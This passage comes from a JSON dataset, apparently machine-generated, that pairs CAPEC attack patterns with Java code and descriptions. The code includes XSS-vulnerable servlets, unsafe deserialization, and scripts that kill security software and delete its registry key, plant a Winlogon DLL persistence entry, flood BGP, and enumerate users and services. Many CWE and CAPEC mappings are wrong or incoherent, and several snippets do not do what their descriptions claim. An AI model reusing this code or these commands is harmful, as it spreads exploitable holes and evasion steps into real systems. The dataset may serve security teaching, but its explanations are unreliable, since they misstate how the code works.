        "description": "This Java code snippet demonstrates a scenario where an adversary blocks logging to a central repository, aligning with CAPEC-117. The code sets up local file logging and logs sensitive information (CWE-532). It then simulates blocking central logging by writing a message to a local file instead of sending logs to a central repository. Additionally, it includes an example of insufficient logging (CWE-778) by logging a user login attempt without sufficient details. This snippet highlights the risks associated with improper logging practices and the potential for an adversary to hide indicators of compromise by preventing logs from reaching a central location."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileInflation {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        try {\n            // Create a file if it doesn't exist\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Inflate the file size by appending large data\n            try (FileOutputStream fos = new FileOutputStream(file, true)) {\n                byte[] largeData = new byte[1024 * 1024 * 10]; // 10 MB of data\n                fos.write(largeData);\n            }\n\n            // Read the file to simulate processing\n            byte[] fileData = Files.readAllBytes(Paths.get(filePath));\n            System.out.println(\"File size after inflation: \" + fileData.length + \" bytes\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of artificially inflating file sizes, which can lead to a Denial of Service (DoS) condition on devices with limited storage capacity. The code creates a file named 'example.txt' if it doesn't already exist and then appends 10 MB of data to it. This process can be repeated to continuously inflate the file size. The code also reads the file to simulate processing, which could be part of a larger attack scenario. This example touches on several related CWEs: it allocates file descriptors without limits (CWE-774), allows potentially dangerous file uploads (CWE-434), and relies on the file name for processing (CWE-646)."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ProcessFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all running processes\n            Process process = Runtime.getRuntime().exec(\"ps -aux\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of process footprinting. The code executes a system command (`ps -aux`) to list all running processes on the target system and prints the output to the console. This can expose sensitive information about the system's processes to unauthorized users (CWE-200). The code does not implement any access control mechanisms to restrict who can execute this command or view its output, leading to potential exposure of sensitive system information (CWE-497). Additionally, the command-line arguments and environment variables used in the process invocation can be visible to other processes on the system (CWE-214)."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ServiceFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Command to list all services on a Windows system\n            String command = \"tasklist /svc\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of service footprinting on a Windows system. The code executes the 'tasklist /svc' command to list all running services and their associated processes. The output is then printed to the console. This represents the CAPEC concept of 'Services Footprinting' by showing how an adversary could exploit functionality meant for authorized users to gather information about the services running on a target system. The code also embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by printing potentially sensitive service information to the console, which could be accessed by unauthorized users."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class AccountFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute the 'net user' command to list all user accounts\n            Process process = Runtime.getRuntime().exec(\"net user\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Account Footprinting' by executing the 'net user' command, which lists all user accounts on a Windows system. The output of this command is read and printed to the console, exposing sensitive information about the system's user accounts. This example embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by making sensitive account information accessible to any user who runs this code. The code also indirectly touches on CWE-214 (Invocation of Process Using Visible Sensitive Information) as the command execution could be monitored by other processes."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class GroupPermissionFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute the command to list local groups\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to 'Group Permission Footprinting' (CAPEC-). The code executes a system command ('net localgroup') to list all local groups on a Windows system. The output of this command, which includes sensitive information about user groups and their permissions, is then printed to the console. This can expose sensitive information to unauthorized actors (CWE-200). The code also indirectly highlights the risk of invoking processes with visible sensitive information (CWE-214) and the potential for exposing access control list files to unauthorized control spheres (CWE-529). The main idea is to show how an adversary could exploit such functionality to gather information about user groups and permissions, which could be used for further targeted attacks."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class OwnerFootprinting {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java OwnerFootprinting <user_home_directory>\");\n            return;\n        }\n\n        File userHomeDir = new File(args[0]);\n        File ntuserDat = new File(userHomeDir, \"ntuser.dat\");\n\n        if (ntuserDat.exists()) {\n            try {\n                BasicFileAttributes attrs = Files.readAttributes(ntuserDat.toPath(), BasicFileAttributes.class);\n                System.out.println(\"Last modified time of ntuser.dat: \" + attrs.lastModifiedTime());\n            } catch (IOException e) {\n                System.out.println(\"Error reading file attributes: \" + e.getMessage());\n            }\n        } else {\n            System.out.println(\"ntuser.dat file does not exist in the specified directory.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Owner Footprinting' by accessing and displaying the last modified time of the 'ntuser.dat' file in a specified user's home directory. The code takes the user's home directory as a command-line argument, checks for the existence of the 'ntuser.dat' file, and then retrieves and prints its last modified time. This information can be used by an adversary to determine the last login time of the user, which can inform further targeted malicious behavior. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-497) and invocation of processes with visible sensitive information (CWE-214)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class DisableSecuritySoftware {\n    private static final Logger logger = Logger.getLogger(DisableSecuritySoftware.class.getName());\n    private static final String SECURITY_TOOL_PROCESS = \"SecurityTool.exe\";\n    private static final String HARD_CODED_ADMIN_PASSWORD = \"admin123\";\n\n    public static void main(String[] args) {\n        try {\n            // Attempt to kill the security tool process\n            Process process = Runtime.getRuntime().exec(\"taskkill /F /IM \" + SECURITY_TOOL_PROCESS);\n            process.waitFor();\n            logger.log(Level.INFO, \"Security tool process killed.\");\n\n            // Delete registry key to prevent security tool from starting at runtime\n            Process regDelete = Runtime.getRuntime().exec(\"reg delete HKLM\\\\Software\\\\SecurityTool /f\");\n            regDelete.waitFor();\n            logger.log(Level.INFO, \"Registry key deleted.\");\n\n            // Use hard-coded credentials to perform unauthorized actions\n            if (authenticate(HARD_CODED_ADMIN_PASSWORD)) {\n                logger.log(Level.INFO, \"Authenticated with hard-coded credentials.\");\n                // Perform additional malicious actions\n            }\n        } catch (IOException | InterruptedException e) {\n            logger.log(Level.SEVERE, \"An error occurred.\", e);\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        // Simulate authentication check\n        return HARD_CODED_ADMIN_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might disable security software by exploiting improper access control and using hard-coded credentials. The code attempts to kill a security tool process, delete a registry key to prevent the tool from starting at runtime, and authenticate using hard-coded credentials. This represents the CAPEC 'Disable Security Software' by showing how an attacker can disable security mechanisms to avoid detection. The use of hard-coded credentials (CWE-798) and improper access control (CWE-284) are highlighted as vulnerabilities that facilitate this attack."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.prefs.Preferences;\n\npublic class WinlogonHelperDLL {\n    public static void main(String[] args) {\n        // CWE-798: Use of Hard-coded Credentials\n        String hardcodedDllPath = \"C:\\\\malicious\\\\malicious.dll\";\n\n        // CWE-15: External Control of System or Configuration Setting\n        Preferences systemRoot = Preferences.systemRoot();\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            systemRoot.put(\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit\", hardcodedDllPath);\n            System.out.println(\"Registry key updated to load malicious DLL at startup.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability. The code modifies a Windows registry key to load a malicious DLL at startup. It uses hard-coded credentials (CWE-798) to specify the path of the malicious DLL. The Preferences API is used to modify the system configuration (CWE-15), and the registry key update represents an uncontrolled search path element (CWE-427). This code is a simplified example of how an attacker could persist malicious code by exploiting these vulnerabilities."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SystemFootprinting {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/system-info\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                System.out.println(\"System Info: \" + response.toString());\n            } else if (responseCode == 404) {\n                System.out.println(\"Resource not found\");\n            } else {\n                System.out.println(\"Unexpected response code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of system footprinting by making an HTTP GET request to a remote server to retrieve system information. The code checks the response code to determine the state of the system. If the response code is 200, it reads and prints the system information. If the response code is 404, it indicates that the resource was not found. This behavior can reveal internal state information (CWE-204) and differences in system behavior (CWE-205). Additionally, the time taken to receive different responses can be used to infer system state (CWE-208). The code also does not handle sensitive information securely, potentially exposing it to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecurityToolFootprint {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list installed security tools\n            String[] commands = {\"cmd.exe\", \"/c\", \"wmic product get name,version\"};\n            Process process = Runtime.getRuntime().exec(commands);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Security Software Footprinting' by attempting to list all installed software on a Windows system, which may include security tools. The code uses the `wmic` command to get the names and versions of installed products. This can expose sensitive system information (CWE-497) to unauthorized users if executed in an insecure context. The code does not include any checks to prevent unauthorized access, making it vulnerable to misuse. Additionally, if this code were part of a larger application, it could be exploited to embed malicious code (CWE-506) or act as a Trojan Horse (CWE-507) by appearing benign while performing unauthorized actions."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class RouteDisablingExample {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.100\";\n        int targetPort = 8080;\n\n        try {\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            Socket socket = new Socket(targetHost, targetPort);\n            System.out.println(\"Connected to target\");\n\n            // Simulate route disabling by closing the socket\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            socket.close();\n            System.out.println(\"Route disabled\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + targetHost);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of the 'Route Disabling' attack pattern. The code attempts to establish a connection to a target host and port, representing a communication channel. It then simulates the disabling of this route by closing the socket, effectively severing the communication channel. The code also highlights potential weaknesses such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not verifying the endpoint properly, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by potentially closing the wrong connection. This example embodies the main idea of disrupting the network route between two entities."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class NetworkDisabler {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\"; // Target network hardware IP\n        int port = 80; // Common port to attempt connection\n\n        try {\n            // Attempt to connect to the target network hardware\n            Socket socket = new Socket(targetIP, port);\n            // Simulate error injection to degrade hardware redundancy\n            injectError(socket);\n            // Improperly handle power save/restore operation\n            powerSaveRestore(socket);\n            // Improperly restrict software interfaces to hardware features\n            controlHardware(socket);\n            // Disable alerts about signal conditions\n            disableAlerts(socket);\n            socket.close();\n        } catch (IOException e) {\n            System.out.println(\"Failed to connect to the target network hardware.\");\n        }\n    }\n\n    private static void injectError(Socket socket) {\n        // Simulate error injection\n        System.out.println(\"Injecting error to degrade hardware redundancy...\");\n    }\n\n    private static void powerSaveRestore(Socket socket) {\n        // Simulate improper power save/restore operation\n        System.out.println(\"Performing improper power save/restore operation...\");\n    }\n\n    private static void controlHardware(Socket socket) {\n        // Simulate improper restriction of software interfaces to hardware features\n        System.out.println(\"Improperly controlling hardware features...\");\n    }\n\n    private static void disableAlerts(Socket socket) {\n        // Simulate disabling alerts about signal conditions\n        System.out.println(\"Disabling alerts about signal conditions...\");\n    }\n}",
        "description": "This Java code snippet represents an attack pattern where an adversary attempts to disable network hardware by connecting to it and performing various malicious actions. The code tries to connect to a target network hardware device using its IP address and a common port. Once connected, it simulates several vulnerabilities: injecting errors to degrade hardware redundancy (CWE-1334), performing improper power save/restore operations (CWE-1304), improperly controlling hardware features (CWE-1256), and disabling alerts about signal conditions (CWE-1320). This demonstrates how an attacker might exploit these weaknesses to disable or degrade the functionality of network hardware."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class BGPRouteDisabling {\n    public static void main(String[] args) {\n        try {\n            // Incorrectly specified destination (CWE-941)\n            String targetAS = \"192.0.2.1\"; // Example IP address of the target Autonomous System\n            Socket socket = new Socket(targetAS, 179); // BGP typically uses port 179\n\n            // Insufficient control of network message volume (CWE-406)\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            for (int i = 0; i < 1000; i++) { // Flooding with excessive BGP update messages\n                out.println(\"BGP UPDATE MESSAGE\");\n            }\n\n            // Improper enforcement of message integrity (CWE-924)\n            // No integrity checks on the messages being sent\n\n            // Selection of less-secure algorithm (CWE-757)\n            // Assuming no encryption or weak encryption for BGP session\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a BGP Route Disabling attack. The code attempts to connect to a target Autonomous System (AS) using an incorrectly specified destination (CWE-941). It then floods the target with excessive BGP update messages (CWE-406), without performing any integrity checks on the messages (CWE-924). Additionally, it assumes no encryption or weak encryption for the BGP session (CWE-757). The main idea is to disrupt the BGP routing by overwhelming the target AS with invalid or excessive routing information, potentially causing network unavailability."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class DNSDomainSeizureExample {\n\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userIP = request.getRemoteAddr();\n        String hostname = getHostName(userIP);\n\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        if (hostname.endsWith(\"trusted-domain.com\")) {\n            // Allow access\n            response.getWriter().write(\"Access granted to \" + hostname);\n        } else {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(\"http://untrusted-site.com\");\n        }\n    }\n\n    private String getHostName(String ip) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(ip);\n            return inetAddress.getHostName();\n        } catch (UnknownHostException e) {\n            return \"unknown-host\";\n        }\n    }\n\n    public static void main(String[] args) {\n        // Simulate a request handling\n        DNSDomainSeizureExample example = new DNSDomainSeizureExample();\n        HttpServletRequest request = null; // Assume this is provided\n        HttpServletResponse response = null; // Assume this is provided\n        try {\n            example.handleRequest(request, response);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a web application relies on reverse DNS resolution to make a security-critical decision, which is a common weakness (CWE-350). The `handleRequest` method retrieves the user's IP address and resolves it to a hostname. If the hostname ends with 'trusted-domain.com', access is granted; otherwise, the user is redirected to an untrusted site (CWE-601). This setup can be exploited by an adversary to influence the web-hosting company to disable a target domain, aligning with the CAPEC description of DNS Domain Seizure. The code also highlights the potential for URL redirection to untrusted sites, which can facilitate phishing attacks."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import java.io.*;\n\nclass User implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String username;\n    private String password; // CWE-499: Serializable Class Containing Sensitive Data\n\n    public User(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"username='\" + username + '\\'' +\n                '}';\n    }\n}\n\npublic class ObjectInjectionExample {\n    public static void main(String[] args) {\n        try {\n            // Simulate receiving serialized data from an untrusted source\n            byte[] serializedData = getMaliciousSerializedData(); // CWE-502: Deserialization of Untrusted Data\n\n            // Deserialize the data without validation\n            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData));\n            User user = (User) ois.readObject();\n            ois.close();\n\n            // Print the deserialized user object\n            System.out.println(user);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] getMaliciousSerializedData() {\n        // This method simulates an attacker providing a malicious serialized object\n        // In a real scenario, this data could be crafted to exploit the deserialization process\n        try {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(baos);\n            oos.writeObject(new User(\"attacker\", \"malicious_code\")); // CWE-506: Embedded Malicious Code\n            oos.close();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return new byte[0];\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to object injection and deserialization of untrusted data (CWE-502). The `User` class contains sensitive data (CWE-499) and is serializable. The `ObjectInjectionExample` class simulates receiving serialized data from an untrusted source, deserializes it without validation, and prints the deserialized object. The `getMaliciousSerializedData` method simulates an attacker providing a malicious serialized object, which could exploit the deserialization process to execute malicious code (CWE-506). This example highlights the risks of deserializing untrusted data and the potential for remote code execution."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userContent = request.getParameter(\"content\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='https://legitimate-site.com' style='display:none;'></iframe>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"var iframe = document.querySelector('iframe');\");\n        response.getWriter().println(\"iframe.onload = function() {\");\n        response.getWriter().println(\"  var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\");\n        response.getWriter().println(\"  iframeDoc.body.innerHTML += '\" + userContent + \"';\");\n        response.getWriter().println(\"};\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Cross Frame Scripting (XFS) vulnerability. The servlet takes user input from a request parameter 'content' and injects it into a hidden iframe that loads a legitimate site. The malicious JavaScript in the servlet interacts with the iframe's content, potentially manipulating the legitimate site's DOM without the user's knowledge. This code also embodies several related CWEs: it does not properly restrict iframe content (CWE-1021), it is vulnerable to cross-site scripting (CWE-79, CWE-692, CWE-82), and it does not verify the legitimacy of the request (CWE-352)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().write(\"<html><body>\");\n        response.getWriter().write(\"<script>\");\n        response.getWriter().write(\"var userInput = '\" + userInput + \"';\");\n        response.getWriter().write(\"document.write(userInput);\");\n        response.getWriter().write(\"</script>\");\n        response.getWriter().write(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a DOM-Based XSS vulnerability. The servlet takes a user input from the request parameter 'input' and directly writes it into a script tag within the HTML response. This input is not validated or sanitized, allowing an attacker to inject malicious JavaScript code. When the page is loaded, the injected script will execute in the context of the user's browser, potentially leading to various attacks such as stealing cookies or session tokens. This example embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSBlockingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable code: Binding to an unrestricted IP address\n            ServerSocket serverSocket = new ServerSocket(0, 50, InetAddress.getByName(\"0.0.0.0\"));\n            System.out.println(\"Server started on: \" + serverSocket.getLocalSocketAddress());\n\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                String request = in.readLine();\n\n                // Vulnerable code: Reliance on IP address for authentication\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                if (isBlockedIP(clientIP)) {\n                    System.out.println(\"Blocked request from: \" + clientIP);\n                    clientSocket.close();\n                    continue;\n                }\n\n                // Vulnerable code: DNS request interception and blocking\n                if (request.contains(\"blocked-domain.com\")) {\n                    System.out.println(\"Blocked DNS request for: \" + request);\n                    clientSocket.close();\n                    continue;\n                }\n\n                // Process the request normally\n                System.out.println(\"Processing request: \" + request);\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isBlockedIP(String ip) {\n        // Example of blocked IPs\n        return ip.equals(\"192.168.1.100\") || ip.equals(\"10.0.0.1\");\n    }\n}",
        "description": "This Java code snippet demonstrates a server that listens on an unrestricted IP address (0.0.0.0), which is a vulnerability (CWE-1327). The server accepts client connections and reads DNS requests. It uses the client's IP address for authentication (CWE-291), which is another vulnerability. The server then checks the DNS request content and blocks requests for a specific domain ('blocked-domain.com'), embodying the main idea of DNS Blocking (CAPEC-300). This code is vulnerable to interception and manipulation by an adversary who can drop or alter DNS requests, thereby denying access to specific services or content."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try {\n            // Binding to an unrestricted IP address (0.0.0.0)\n            ServerSocket serverSocket = new ServerSocket(8080, 50, InetAddress.getByName(\"0.0.0.0\"));\n            System.out.println(\"Server started on 0.0.0.0:8080\");\n\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // Reliance on IP address for authentication\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                if (clientIP.equals(\"192.168.1.100\")) {\n                    System.out.println(\"Authenticated client: \" + clientIP);\n                } else {\n                    System.out.println(\"Unauthenticated client: \" + clientIP);\n                    clientSocket.close();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that embodies the main idea of the CAPEC 'IP Address Blocking' and related CWEs. The server binds to an unrestricted IP address (0.0.0.0), making it accessible from any network interface (CWE-1327). It then relies on the client's IP address for authentication (CWE-291), which is a weak security measure. An adversary could exploit this by spoofing the IP address or blocking packets destined for the target IP address, thereby preventing legitimate access to the service. The code also lacks proper verification of the communication channel's integrity and endpoint identity (CWE-300, CWE-923), and it relies on client-side enforcement of security (CWE-602)."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ReflectedXSSExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome, \" + userInput + \"</h1>\"); // Vulnerable to XSS\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Reflected XSS vulnerability. The code takes user input from an HTTP GET request parameter named 'input' and directly includes it in the HTML response without any sanitization or encoding. This allows an attacker to inject malicious scripts into the web page, which will be executed in the victim's browser. The vulnerability is related to CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), CWE-692 (Incomplete Denylist to Cross-Site Scripting), CWE-84 (Improper Neutralization of Encoded URI Schemes), and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\n@WebServlet(\"/storeComment\")\npublic class StoreCommentServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String comment = request.getParameter(\"comment\");\n        // Simulate storing the comment in a database\n        // In a real application, this would involve database operations\n        request.getSession().setAttribute(\"storedComment\", comment);\n        response.sendRedirect(\"/displayComment\");\n    }\n}\n\n@WebServlet(\"/displayComment\")\npublic class DisplayCommentServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        String storedComment = (String) request.getSession().getAttribute(\"storedComment\");\n        // Vulnerable to Stored XSS\n        out.println(\"<html><body>\");\n        out.println(\"<h1>Comments</h1>\");\n        out.println(\"<p>\" + storedComment + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a simple web application vulnerable to Stored Cross-site Scripting (XSS). The `StoreCommentServlet` accepts user input via a POST request and stores it in the session. The `DisplayCommentServlet` retrieves the stored comment and displays it on a web page without proper input neutralization. This lack of input validation and neutralization allows an attacker to store malicious scripts that will be executed when other users view the comments, embodying the main idea of CAPEC-63 (Stored XSS). The related CWEs highlight the improper neutralization of input (CWE-79), incomplete denylist (CWE-692), and other specific XSS vulnerabilities that are not addressed in this code."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
